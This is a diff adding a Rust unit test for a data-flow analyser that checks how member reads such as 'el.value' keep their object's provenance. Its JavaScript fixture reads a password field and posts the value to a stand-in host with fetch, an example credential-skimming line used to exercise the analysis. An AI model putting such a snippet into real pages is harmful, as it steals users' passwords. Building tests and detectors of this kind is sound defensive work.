@@ -865,3 +865,39 @@ fn lua_colon_calls_keep_method_and_receiver_provenance() {
             .any(|v| v.target.as_deref() == Some("x.write"))
     );
 }
+
+#[test]
+fn member_reads_name_their_path_and_keep_their_object() {
+    let flow = graph(
+        "a.js",
+        "const value = secret();\nconst el = document.querySelector('input[type=password]');\nfetch('https://x.test/', {body: JSON.stringify({p: el.value, q: lookup().text})});\n",
+    );
+    let member = |path: &str| {
+        flow.values
+            .iter()
+            .position(|v| v.kind == FlowKind::Member && v.target.as_deref() == Some(path))
+            .unwrap_or_else(|| panic!("no member {path}: {flow:?}"))
+    };
+    // The object stays reachable through the read.
+    let origins = flow.origins(member("el.value"), &[], 1000);
+    assert!(
+        origins
+            .values
+            .iter()
+            .any(|o| flow.values[o.value].target.as_deref() == Some("document.querySelector"))
+    );
+    // The property is not the local `value`.
+    assert!(
+        !origins
+            .values
+            .iter()
+            .any(|o| flow.values[o.value].target.as_deref() == Some("secret"))
+    );
+    // A call in the path is a joint, as in call targets.
+    let text = flow.origins(member("lookup.text"), &[], 1000);
+    assert!(
+        text.values
+            .iter()
+            .any(|o| flow.values[o.value].target.as_deref() == Some("lookup"))
+    );
+}
